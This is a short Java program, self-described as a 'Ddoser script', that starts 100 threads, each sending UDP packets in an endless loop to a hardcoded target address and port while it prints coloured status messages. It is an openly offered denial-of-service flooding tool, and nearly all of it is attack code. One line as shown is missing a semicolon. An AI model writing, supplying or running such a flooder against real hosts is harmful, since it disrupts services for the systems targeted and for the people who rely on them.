import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class Main {
  
    public static void main(String[] args) {
        int numThreads = 100;
        String targetIP = "192.168.0.1";
        int targetPort = 80;
       
      System.out.println("\u001B[32mA Ddoser script made by dev 21sus #4212")
       
          for (int i = 0; i < numThreads; i++) {
            Thread thread = new Thread(() -> {
                try {
                    DatagramSocket socket = new DatagramSocket();
                    byte[] data = new byte[1024];
                    DatagramPacket packet = new DatagramPacket(data, data.length, InetAddress.getByName(targetIP), targetPort);

                    while (true) {
                        socket.send(packet);
                        System.out.println("\u001B[32mSent request: " + packet.getAddress() + ":" + packet.getPort() + "\u001B[0m"); // Green text
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    System.out.println("\u001B[31mError sending request: " + e.getMessage() + "\u001B[0m"); // Red text
                }
            });
            thread.start();
        }
    }
}
